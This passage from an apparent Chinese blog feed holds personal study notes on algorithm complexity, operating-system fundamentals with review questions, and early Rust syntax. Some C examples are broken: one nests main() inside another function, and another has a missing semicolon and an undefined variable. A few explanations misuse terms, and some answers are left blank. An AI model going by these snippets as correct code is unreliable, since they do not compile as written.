id="时间复杂度">时间复杂度</h4><p>如何评估算法事件开销？<br>需要排除与算法本身无关的外界因素，且能够事先预估<br><strong>算法时间复杂度</strong>：<br>事前预估算法事件开销T(n)与问题规模n的关系(T标识&quot;time&quot;)<br>$$<br>T=T(n)<br>$$</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 算法1-逐步递增型爱你  </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">loveYou</span><span class="params">(<span class="type">int</span> n)</span> &#123;  </span><br><span class="line">  <span class="type">int</span> i = <span class="number">1</span>;  </span><br><span class="line">  <span class="keyword">while</span>(i &lt;= n ) &#123;  </span><br><span class="line">    i ++ ;  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I love You %d\n&quot;</span>, i);  </span><br><span class="line">  </span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;  </span><br><span class="line">    loveYou(<span class="number">3000</span>);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>语句频度<br>$$<br>T(3000)=1+3001+3000∗2+1<br>$$<br>时间开销与问题规模n的关系：<br>$$<br>T(n)=3n+3<br>$$<br>当表达式很复杂之后，是否可以忽略表达式的某些部分？<br>可以忽略较低阶的部分，只考虑保留高阶的部分。<br>$$<br>T(n)=O(f(n))<br>$$<br>只需要关注数量级。</p><ol><li>加法规则<br>$$<br>T(n)=T1(n)+T2(n)=O(f(n))+O(g(n))=O(max(f(n),g(n)))<br>$$<br>多项相加，只保留最高阶的项，且系数变为1</li><li>乘法规则<br>$$<br>T(n)=T1(n)∗T2(n)=O(f(n))∗O(g(n))=O(f(n)∗g(n))<br>$$<br>多项相乘，都保留</li></ol><p>eg：$T3(n)=n3+n2∗log2n=O(n3)+O(n2∗log2⁡n)$</p><p><strong>常见时间复杂度数量级比较</strong>:<br>$O(1)&lt;O(log2⁡(n))&lt;O(n)&lt;O(n2)&lt;O(n3)&lt;O(2n)&lt;O(n!)&lt;O(nn)$<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/b305b011-05ed-40d2-bb91-742c7a5d2d04.png" alt="alt text"><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/45a42f9f-857d-41d5-8e0c-cc0efdc1dc69.png" alt="alt text"><br><strong>小tips</strong>：常对幂指阶（越往后，算法越差）<br>若代码量足够大，是否还需要按照上述方法按行去数？<br><em><strong>结论</strong></em>：顺序执行的代码只会影响常数项，可以忽略；只需要挑循环中的一个基本操作分析它的执行次数与n的关系即可；如果多层嵌套循环，只需要关注最深层循环了几次，找到执行次数与n的关系即可。<br>例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">loveYou</span><span class="params">(<span class="type">int</span> flag[], <span class="type">int</span> n)</span> &#123;  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;I am Iron Man\n&quot;</span>);  </span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (flag[i] == n) &#123;  </span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;I Love You %d\n&quot;</span>, n);  </span><br><span class="line">      <span class="keyword">break</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;  </span><br><span class="line">  <span class="type">int</span> flag[n] = &#123;&#125;;  </span><br><span class="line">  loveYou(flag, n);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述算法中，可以引伸出两种事件复杂度：<br>若n位于flag数组的首部，则称为最好时间复杂度$T(n)=O(1)$<br>若n位于flag数组的尾部，则称为最差时间复杂度$T(n)=O(n)$<br>若n在任意一个位置的概率相同，为$1/n$，则称为平均时间复杂度$T(n)=O(n)$<br><strong>最坏时间复杂度</strong>：最坏情况下算法的时间复杂度。<br><strong>最好时间复杂度</strong>：最好情况下算法的时间复杂度。<br><strong>平均时间复杂度</strong>：所有输入示例等概率出现的情况下，算法的期望运行时间。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/a1635109-0efd-4c87-83d6-2876bad403d2.png" alt="alt text"><br><em>小故事</em>：算法的性能只有在n很大时才会暴露出来。</p><h4 id="空间复杂度">空间复杂度</h4><p>无论问题规模怎么变，算法运行所需要的内存空间都是固定的常量，算法空间复杂度为：<br>$$<br>S(n)=O(1)<br>$$<br>算法原地工作–算法所需的内存空间为常量。<br>只需要关注存储空间大小与问题规模相关的变量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span> n)</span> &#123;  </span><br><span class="line">  <span class="type">int</span> flag[n][n];  </span><br><span class="line">  <span class="type">int</span> other[n];  </span><br><span class="line">  <span class="type">int</span> i;  </span><br><span class="line">  <span class="comment">// …………  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$$<br>S(n)=O(n2)+O(n)+O(1)<br>$$<br><strong>函数递归调用带来的内存开销</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">loveYou</span><span class="params">(<span class="type">int</span> n)</span> &#123;  </span><br><span class="line">  <span class="type">int</span> a, b, c;  </span><br><span class="line">  <span class="comment">// ………………  </span></span><br><span class="line">  <span class="keyword">if</span>(n &gt; <span class="number">1</span>) &#123;  </span><br><span class="line">    loveYou(n<span class="number">-1</span>);  </span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;I love you %d\n&quot;</span>, n);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;  </span><br><span class="line">  loveYou(<span class="number">5</span>);  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/500c37ea-8ba1-4548-a90e-d832f776ce36.png" alt="alt text"><br>$$<br>空间复杂度=递归调用的深度。<br>$$<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/261c9d46-0845-4aec-bd9a-696d96ae43d2.png" alt="alt text"></p><h2 id="小结">小结</h2><h2 id="线性表">线性表</h2><p>存储结构不同，运算的实现方式不同</p><h3 id="定义">定义</h3><p>线性表是具有相同数据类型的<code>n(n&gt;=0)</code>个数据元素的有限序列，其中n为表长，当n=0时线性表是一个空表。若用L命名线性表，则其一般表示为<br>$$<br>L=(a_1,a_2,…,a_i,a_{i+1},…,a_n)<br>$$<br>几个概念：<br>$a_i$是线性表中的第i个元素线性表的位序（位序从1开始，程序下标从0开始）<br>$a_1$是表头元素；$a_n$是表尾元素。<br>除第一个元素外，每个元素有且仅有一个直接前驱；除最后一个元素外，每个元素有且仅有一个直接后继。</p><h3 id="基本操作">基本操作</h3><p>InitList(&amp;L):初始化表。构造一个空的线性表L，分配内存空间。<br>DestroyList(&amp;L):销毁操作。销毁线性表，并释放线性表L所占用的内存空间。<br>ListInsert(&amp;L,i,e):插入操作。在表L中的第i个位置上插入指定元素e。<br>ListDelete(&amp;L,i,&amp;e):删除表L中第i个位置的元素，并用e返回删除元素的值。<br>LocalteElem(L,e):按值查找操作。在表L中查找具有给定关键字值的元素。<br>GetElem(L,i):按位查找操作。获取表L中第i个位置的元素的值。<br>其他常用操作：<br>Length(L)：求表长。返回线性表L的长度，即L中数据元素的个数。<br>PrintList(L)：输出操作。按前后顺序输出线性表L的所有元素值。<br>Empty(L):判空操作。若L为空表，则返回true，否则返回false。</p>]]></content>
    
    
    <summary type="html">数据结构复习笔记</summary>
    
    
    
    <category term="计算机基础" scheme="https://www.xvzhang.fun/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="数据结构" scheme="https://www.xvzhang.fun/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>操作系统复习</title>
    <link href="https://www.xvzhang.fun/posts/cd647b6c.html"/>
    <id>https://www.xvzhang.fun/posts/cd647b6c.html</id>
    <published>2025-05-07T07:58:52.000Z</published>
    <updated>2025-05-10T14:59:44.000Z</updated>
    
    <content type="html"><![CDATA[<h1>操作系统</h1><h2 id="基础概念">基础概念</h2><h3 id="概念和定义">概念和定义</h3><p>操作系统（Operating System， OS）是指控制和管理整个计算机系统的硬件和软件资源，并合理地组织调度计算机的工作和资源的分配；以提供给用户和其他软件方便的接口和环境；他是计算机系统中最基本的系统软件。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/a6062709-7927-46ae-9c6c-00e43cdbe16a.png" alt="alt text"><br>执行一个程序前需要将该程序放到内存中，才能被CPU处理。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/173be557-4b52-4e12-97f0-35e5d70df099.png" alt="alt text"></p><h3 id="操作系统的功能和目标">操作系统的功能和目标</h3><h4 id="向上层提供方便易用的服务">向上层提供方便易用的服务</h4><p>联机命令接口=交互式命令接口（windows-CMD命令行）<br>脱机命令接口=批处理命令接口（Windows-*.bat文件）<br>程序接口：可以在程序中进行系统调用来使用程序接口。普通用户不能直接使用程序接口，只能通过程序代码间接使用<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="alt text"><br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="alt text"></p><h4 id="作为最接近硬件的层次">作为最接近硬件的层次</h4><p>需要实现对硬件机器的拓展，没有任何软件支持的计算机成为裸机。在裸机上安装的操作系统，可以提供资源管理功能和方便用户的服务功能，将裸机改造成功能更强、使用更方便的机器。<br>通常把覆盖了软件的机器成为扩充机器，又称之为虚拟机。<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="alt text"></p><h3 id="操作系统的特征">操作系统的特征</h3><h4 id="并发">并发</h4><p>并发：指两个或多个事件在同一时间间隔内发生。这些事件宏观上是同时发生的，但微观上是交替发生的。<br>并行：指两个或多个事件在同一时刻同时发生。<br>操作系统的并发性：指计算机系统中“同时”运行着两个程序，这些程序宏观上看是同时运行着的，而微观上看是交替运行的。<br>操作系统就是伴随着“多道程序技术”而出现的。因此，操作系统和程序并发是一起诞生的。<br><strong>注意：</strong></p><ul><li>单核CPU同一时刻只能执行一个程序，各个程序只能并发地执行</li><li>多核CPU同一时刻可以同时执行多个程序，多个程序可以并行地执行。（例如intel的第八代i3处理器就是4核CPU，意味着可以并发地执行4个程序。）<br>即使对于4核CPU来说，只要有4各以上的程序需要“同时”运行，那么并发性依然是必不可少的<br><strong>并发性是操作系统一个最基本的特性</strong></li></ul><h4 id="共享">共享</h4><p>共享即资源共享，是指系统中的资源可供内存中多个并发执行的进程共同使用。<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="alt text"><br>所谓的“同时”往往是宏观上的，而在微观上，这些进程可能是交替地对该资源进行访问（即分时分享）<br>eg：<br>互斥共享方式：使用QQ和微信视频，同一时间段内摄像头只能分配给其中一个进程。<br>同时共享方式：使用QQ发送A，同时使用微信发送文件B。宏观上，两边在同时读取并发送文件，说明两个进程都在访问硬盘资源，从中读取数据。微观上，两个进程是交替访问硬盘的。</p><h4 id="并发和共享的关系">并发和共享的关系</h4><p>并发性指计算机系统中同时存在着多个运行着的程序。<br>共享性是指系统中的资源可供内存中多个并发执行的进程共同使用。<br><strong>注：</strong><br>使用QQ发送文件A，使用微信发送文件B：</p><ol><li>两个进程正在并发执行（并发性）</li><li>需要共享地访问硬盘资源（共享性）</li></ol><p>可知：</p><ul><li>如果失去并发性，则系统中只有一个程序在运行，则共享性失去了存在的意义</li><li>如果失去共享性，则内存中多个执行的进程不能同时访问系统中的资源，就无法实现同时工作，也就无法并发。<br><strong>所以，并发和共享是充分必要条件</strong></li></ul><h4 id="虚拟">虚拟</h4><p>虚拟是指把一个物理上的试题变为若干个逻辑上的对应物，物理实体是实际储存在的，而逻辑上对应物是用户感受到的。<br>虚拟技术：</p><ul><li>空分复用技术（如虚拟存储器技术）</li><li>时分复用技术（如虚拟处理器）</li></ul><p>显然，如果失去了并发性，则一个时间段内系统中只运行一道程序，那么就失去了实现虚拟性的意义了。因此，<strong>没有并发性，就谈不上虚拟性。</strong></p><h3 id="课后题">课后题</h3><ol><li>在计算机系统上配置OS（operating system，操作系统）的目标是什么？作用主要表现在哪几个方面？<br>解：目标是实现方便性、有效性、可扩充性、开放性。作用主要表现在OS作为用户与计算机硬件系统之间的接口、作为计算机系统资源的管理者、实现了对计算机资源的抽象。</li><li>试说明OS与硬件、其他系统软件以及用户之间的关系。<br>解：OS是铺设在计算机硬件上的多层软件的集合，实现了对计算机硬件操作的多个层次的抽象模型。抽象层次越高，抽象接口所提供的功能就越强，用户使用起来也就越方便。</li><li>试说明推动OS发展的主要动力是什么。<br>解：推动OS发展的主要动力是：为了不断提高计算机系统资源的利用率、为了方便用户、器件的不断更新换代、计算机体系结构的不断发展以及不断提出新的应用需求。</li><li>在OS中，何谓脱机I/O（input/output，输入/输出）方式和联机I/O方式？<br>解：脱机I/O方式：指的是程序和数据的输入输出都是在外围机的控制下完成（都是在脱离主机的情况下进行的），而联机I/O方式则是在主机的直接控制下进行I/O的方式。</li><li>试说明推动分时系统形成和发展的主要动力是什么。<br>解：为了满足用户对人机交互方面的需求，推动了分时系统的形成和发展，主要表现在：人机交互、共享主机等方面。</li><li>实现分时系统的关键问题是什么？应如何解决？<br>解：关键问题是：用户如何与自己的作业进行交互，为此，首先要求系统必须能提供多个终端给多个用户使用；其次，当用户在自己的终端上键入命令时，系统应能及时接受并处理该命令，然后将处理结果返回给用户。解决：1). 及时接受：要做到及时接受多个用户键入的命令或数据，只须在系统中配置一个多路卡即可。2). 及时处理：人机交互的关键在于，用户键入命令后，能对自己的作业极其运行及时地实时控制，或进行修改。因此，各个用户的作业都必须驻留在内存中，并能频繁地获得处理机运行。所以，为了实现人机交互，需要使用：(1). 采用作业直接进入内存的方式。因为作业在磁盘上是不能运行的，所以应该直接进入内存。(2). 采用轮转运行的方式。如果一个作业独占处理机而连续运行，那么其他作业就没有机会被调度运行。为了避免一个作业长期独占处理机，引入了时间片的概念。系统规定每个作业每次只能运行一个时间片，然后就暂停该作业的运行，并立即调度下一个作业运行。</li><li>为什么要引入实时系统？<br>解：因为系统的正确性不仅由计算的逻辑结果来确定，而且还取决于产生结果的时间。为了系统能及时响应外部事件的请求，在规定的时间内完成对该事件的处理，并控制所有实时任务协调一致的运行，所以需要引入实时系统。</li><li>什么是硬实时任务和软实时任务？试举例说明<br>解：硬实时任务(hard real time, HRT)：是指系统必需满足对截止时间的要求，否则可能出现难以预测的后果。比如用于工业控制和武器控制的实时系统，若系统不满足对截止时间的要求，则会出现很严重的问题。软实时任务(soft real time, SRT)：其对截止事件的要求没有那么严格，偶尔错误任务的截止事件，对事件的影响也不会太大。例如，信息查询系统和多媒体系统中的实时任务。</li><li>试从及时性、交互性及可靠性方面对分时系统与实时系统进行比较。<br>解：(1). 信息查询系统对实时性的要求是依据人所能接受的等待事件确定的。多媒体系统实时性的要求是播放出来的音频和视频能令人满意。实时控制系统的实时性则是以控制对象所要求的截止时间来确定，一般为秒级到毫秒级。(2). 交互性：在信息查询系统中，人与系统的交互性仅限于访问系统中某些特定的专用服务程序。它并不能像分时系统那样向终端用户提供数据处理、资源共享等服务。多媒体系统的交互性也仅限与由用户发送某些特定的命令，如开始、停止、快进等，然后由系统立即响应。(3). 可靠性：分时系统要求系统可靠，实时系统要求系统高度可靠，因为任何差错都可能带来无法预料的灾难性后果。因此，在实时系统中，往往都采用了多级容错措施，以保障系统及数据的安全性。</li><li>微机OS按运行方式来分，可以分为哪几类？举例说明。<br>解：微机OS按运行方式来分可以分为：(1). 单用户单任务OS，只允许一个用户上机，且只允许用户程序作为一个任务运行，如CP/M(8位)和MS-DOS(16位)。(2). 单用户多任务OS，只允许一个用户上机，但允许用户把程序分为若干个任务并发执行，从而有效地改善了系统性能。如微软公司推出的windows系列，windows3.1、windows95/98等。(3). 多用户多任务，允许多个用户通过各自的终端使用同一台机器，共享主机系统中的各种资源，而每个用户程序又可进一步分为几个任务，使它们能够并发执行，从而可进一步提高资源利用率和系统吞吐量。如UNIX系统、各类类UNIX系统（linux，Solaris等）以及windows NT/Server系列的系统。</li><li>OS具有哪几大特征？它们之间有何关系？<br>解：OS同时具有并发、共享、虚拟和异步这四个基本特性。并发是共享的充分必要条件，没有并发性，就没有虚拟性，也就没有异步性。</li><li>是什么原因使OS具有异步特征?<br>解：因为进程是以人们不可预知的速度向前推进的，所以OS具有异步性。</li><li>何谓OS内核? OS内核的主要功能是什么?<br>解：现代OS一般会划分为若干层次，再将不同功能分别设置在不同层次中。通常将一些与硬件紧密相关的模块（如中断处理程序等）、各种常用设备的驱动程序、运行频率较高的模块（如时钟管理模块、进程调度模块等）以及许多模块所公用的一些基本操作，都安排在紧靠硬件的软件层次中，并将它们常驻内存。这个就叫OS内核。OS内核这样安排的目的是：便于对这些软件进行保护，防止它们遭受其他应用的破坏；其次可以提高OS的运行效率。所以OS内核的主要功能是：(1). 主要实现提供给OS其他众多模块所需要的一些基本功能，以支撑这些模块工作。其中3种最基本的支撑功能是：中断处理、时钟管理和原语操作。(2). 资源管理功能：提供进程管理、存储器管理、设备管理功能。</li><li>何谓原语? 何谓原子操作?<br>解：原语(primitive)，就是由若干条指令组成的，用于完成一定功能的一个过程。原子操作(action operation)：指一个操作中的所有动作要么全做，要么全不做，此即原子性。他是一个不可分割的基本单位。</li><li>简要描述处理机的双重工作模式。<br>解：一般地，处理机至少需要两种单独运行模式：用户态和内核态。<br>(1). 用户态也称为目态，计算机硬件可以通过一个模式位为1来表示它。当计算机系统执行用户程序时，系统处于用户态<br>(2). 内核态也称为管态或系统态，计算机硬件可以通过一个模式位为0来表示它。每当OS能够控制计算机时，它就处于内核态。例如，当用户程序通过系统调用请求OS服务时，系统必须从用户态切换到内核态，以响应请求。</li><li>简述中断处理过程。<br>解：一旦CPU响应中断，系统就会开始进行中断处理。中断处理过程主要包括以下3步：<br>(1). 保护被中断进程的现场。为了在中断处理结束后能使进程正确地返回中断点，系统必须保存当前处理机状态字和程序计数器的值。<br>(2). 分析中断原因，转去执行相应的中断处理程序。在多个中断请求同时发生时，处理优先级最高的中断源所发出的中断请求。<br>(3). 恢复被中断进程的现场，CPU继续执行被中断的原进程。</li><li>处理机管理有哪些主要功能? 它们的主要任务是什么?<br>解：处理机管理的主要功能有进程管理有进程管理、进程同步、进程通信和处理机调度。各部分的主要任务为：①进程管理，为作业创建进程，撤销已结束进程，控制进程在运行过程中的状态转换； ②进程同步，协调多个进程(含线程)的运行；③进程通信，实现在相互合作的进程之间进行信息交换；④处理机调度，包括作业调度和进程调度。作业调度是按照一定的算法从后备队列里选出若干个作业，为它们分配运行所需的资源；进程调度是按照一定的算法从进程的就绪队列中选出一个进程，把处理机分配给它，并设置运行现场，使进程投入执行。</li><li>存储器管理有哪些主要功能? 它们的主要任务是什么?<br>解：内存管理的主要功能有内存分配、内存保护、地址映射和内存扩充。各部分的主要任务为：①内存分配，为每道程序分配内存；②内存保护，确保每道程序仅在自己的内存空间运行，彼此互不干扰；③地址映射，将地址空间的逻辑地址转换为内存空间对应的物理地址；④内存扩充，即从逻辑上扩充内存，实现请求调入功能和置换功能等。</li><li>设备管理有哪些主要功能? 它们的主要任务是什么?<br>解：设备管理的主要功能包括缓冲管理、设备分配、设备处理以及设备虚拟等。各部分的主要任务为：①完成用户提出的I/O请求，为用户进程分配所需的I/O设备，并完成指定的I/O操作；②提高CPU和I/O设备的利用率，提高I/O速度，方便用户使用I/O设备。</li><li>文件管理有哪些主要功能? 它们的主要任务是什么?<br>解：文件管理的主要功能有：文件存储空间的管理、目录管理、文件的读/写管理和保护。其主要任务是对用户文件和系统文件进行管理以方便用户使用，并保证文件安全。</li><li>现代OS的新功能有哪些?<br>解：现代OS是在传统OS的基础上发展而来，它除了具有传统OS的功能外，还具有保障系统安全、支持用户通过联网获取服务和可处理多媒体信息等功能。</li><li>什么是微内核OS？它具有哪些优点?<br>解：微内核OS具有如下4个特征：①足够小的内核；②基于客户/服务器模式；③应用策略与机制分离原则；④采用面向对象技术。<br>微内核OS的主要优点包括：①提高了系统的可扩展性；②增强了系统的可靠性和可移植性；③提供了对分布式系统的支持；④融入了面向对象技术。</li><li>外核OS的基本思想是什么?<br>解：外核OS的基本思想是：内核不提供传统OS的进程、虚拟存储等抽象事物，而是专注于物理资源的隔离(保护)与复用。具体来说，在基于外核结构的OS中，内核负责保护系统资源，而硬件资源的管理职责则委托给了应用程序，这样，OS就可以做到在保证资源安全的前提下，减少对应用程序的限制，充分满足应用程序对硬件资源的不同需求。</li><li>什么是系统调用? 系统调用与一般用户程序和库函数有何区别?<br>解：系统调用是OS提供给程序员的唯一接口。程序员利用系统调用，在源程序层面动态请求和释放系统资源，并调用系统中已有的系统功能来完成那些与机器硬件部分相关的工作以及控制程序的执行速度等。因此，系统调用像一个“黑箱子”，对用户屏蔽了OS的具体动作而只提供有关的功能。<br>系统调用与一般用户程序、库函数的区别在于：①系统调用（程序）在内核态执行，调用它们时需要一个类似于硬件中断处理机制的中断处理机制来提供系统服务；②普通的用户程序是直接为用户完成某特定功能而设计的，他们一般在用户态执行；③库函数是把函数放到库里供别人使用的一种方式，是面向应用开发、方便人们编程的。④</li><li>设有3道程序A、B、C，它们按照优先次序（A→B→C）顺序执行，它们的计算时间和I/O操作时间如表1-1-1所示，假设3道程序以串行方式使用相同的设备进行I/O操作，试画出单道程序运行和多道程序运行的时间关系图，并计算完成这3道程序所须花费的时间。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/a72523bf-35f5-4cba-87ac-43c157a8121a.png" alt="alt text"><br>解：</li><li>一个多道批处理系统中仅有 P_1 和 P_2 两个作业，P_2 比 P_1 晚5ms到达，它们的计算和I/O操作顺序如下。<br>P_1：计算60ms，I/O操作80ms，计算20ms。<br>P_2：计算120ms，I/O操作40ms，计算40ms。<br>不考虑调度和切换时间，请计算完成两个作业需要的最少时间。<br>解：</li><li>OS的概念、特征和功能是什么?<br>解：(1). OS是一组控制盒管理计算机硬件和软件资源、合理地对各类作业进行调度以方便用户使用计算机的程序集合。OS是配置在计算机硬件上的第一层系统软件，是对硬件系统的首次扩充；是硬件系统和应用软件间的桥梁；是用户让计算机硬件进行交互的接口；是计算机系统资源的管理者。<br>(2). OS的4个特征：并发、共享、虚拟、异步。①并发：一段时间间隔内多个进程（线程）并发执行，是宏观上的并行，微观上的串行。②共享：系统中的资源可供内存中多个并发执行的进程或线程共同使用。③虚拟：通过某种技术将物理实体变为若干个逻辑上的对应物。④异步：进程以人们不可预知的速度向前推进，每次运行只要环境相同，则结果必定一致。<br>(3). OS的5大功能：处理机管理、存储器管理、设备管理、文件管理、接口管理。①处理机管理：进程（线程）是处理机调度的单位，因此对外处理器的管理实际上是对进程（线程）的管理。②存储器管理：内存的分配与回收、地址转换、虚拟内存的实现等。③设备管理：设备的分配与回收、缓冲区管理、磁盘调度、设备虚拟等。④文件管理：文件存储空间的管理、文件目录管理、文件共享与保护等。⑤接口管理：用户接口、程序接口、命令接口和网络接口。</li><li>若某计算问题的执行情况如图1-1-6所示。则请回答下列问题。<br>（1）叙述该计算问题中处理机、输入机和打印机是如何协同工作的。<br>（2）计算在图1-1-6所示执行情况下处理机的利用率。<br>（3）简述处理机利用率不高的原因。<br>（4）请画出能提高处理机利用率的执行方案。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/ebd6e254-10a1-4124-83f3-147e40775ae1.png" alt="alt text"><br>解：</li></ol>]]></content>
    
    
    <summary type="html">操作系统复习笔记</summary>
    
    
    
    <category term="计算机基础" scheme="https://www.xvzhang.fun/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="操作系统" scheme="https://www.xvzhang.fun/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>Rust初学</title>
    <link href="https://www.xvzhang.fun/posts/dda744fb.html"/>
    <id>https://www.xvzhang.fun/posts/dda744fb.html</id>
    <published>2025-05-07T07:36:03.000Z</published>
    <updated>2025-05-10T14:59:44.000Z</updated>
    
    <content type="html"><![CDATA[<h1>Rust基础学习</h1><h2 id="变量绑定与解构">变量绑定与解构</h2><p>变量绑定：<code>let a = &quot;hello word&quot;</code><br>不可变变量声明：<code>let a = &quot;hello word&quot;</code><br>可变变量声明：<code>let mut x =5</code><br>未使用变量声明：<code>let _y = 6</code><br>变量解构：<code>let (a, mut b): (bool, bool) = (true, false)</code><br>变量遮蔽(shadowing)：在后面声明的变量会遮蔽掉前面声明的，如下：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;  </span><br><span class="line">  <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">5</span>;  </span><br><span class="line">  <span class="comment">// 在main函数的作用域内对之前的x进行遮蔽  </span></span><br><span class="line">  <span class="keyword">let</span> <span class="variable">x</span> = x + <span class="number">1</span>;  </span><br><span class="line">  </span><br><span class="line">  &#123;  </span><br><span class="line">    <span class="comment">// 在当前花括号的作用域内，对之前的x进行遮蔽  </span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = x * <span class="number">2</span>;  </span><br><span class="line">  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简而言之，变量遮蔽就是在不同的作用域中可以声明相同变量名的变量。</p><h2 id="基本数据类型">基本数据类型</h2><p>无外乎那么几种类型，但是注意，在Rust语言中，我们需要显式地基于变量一个类型，否则编译器将自动推导。<br>这里整理一份基本类型的表：</p><h3 id="数值类型">数值类型</h3><p><strong>整数类型</strong>：</p><table><thead><tr><th>长度</th><th>有符号类型</th><th>无符号类型</th></tr></thead><tbody><tr><td>8</td><td>i8</td><td>u8</td></tr><tr><td>16</td><td>i16</td><td>u16</td></tr><tr><td>32</td><td>i32</td><td>u32</td></tr><tr><td>64</td><td>i64</td><td>u64</td></tr><tr><td>128</td><td>i128</td><td>u128</td></tr><tr><td>视架构而定</td><td>isize</td><td>usize</td></tr></tbody></table><p>类型定义的统一形式为：<code>有无符号+类型大小</code>，无符号数(unsigned)表示数字只能取0和正数，范围在<code>0~2^n-1</code>，有符号(integer)标识数字可取正数、负数和0，范围在<code>-(2^(n-1)~2^(n-1)-1)</code>。<br>并且，在rust中规定的字面量表示方法：</p><table><thead><tr><th>数字字面量</th><th>示例</th></tr></thead><tbody><tr><td>十进制</td><td>98_222</td></tr><tr><td>十六进制</td><td>0xff</td></tr><tr><td>八进制</td><td>0o77</td></tr><tr><td>二进制</td><td>0b1111_0000</td></tr><tr><td>字节（仅限于u8）</td><td>b’A’</td></tr></tbody></table><p>rust整型默认使用<code>i32</code>。<br>显式处理可能出现整型溢出的方法：</p><ul><li>使用<code>wrapping_*</code>方法在所有模式下都按照补码循环溢出的规则处理。</li><li>如果使用<code>checked_*</code>方法是发生溢出，则返回<code>None</code>值</li><li>使用<code>overflowing_*</code>方法返回该值和一个指示是否存在溢出的布尔值。</li><li>使用<code>saturating_*</code>方法，可以限定计算后的结果不超过目标类型的最大值或低于最小值。</li></ul><p><strong>浮点类型</strong>：</p><p>浮点类型，zairust中使用（单精度浮点型）<code>f32</code>和（双精度浮点型）<code>f64</code>来表示，默认浮点类型为<code>f64</code>。</p><p><strong>浮点数陷阱</strong>：<br>浮点数由于底层格式的特殊性，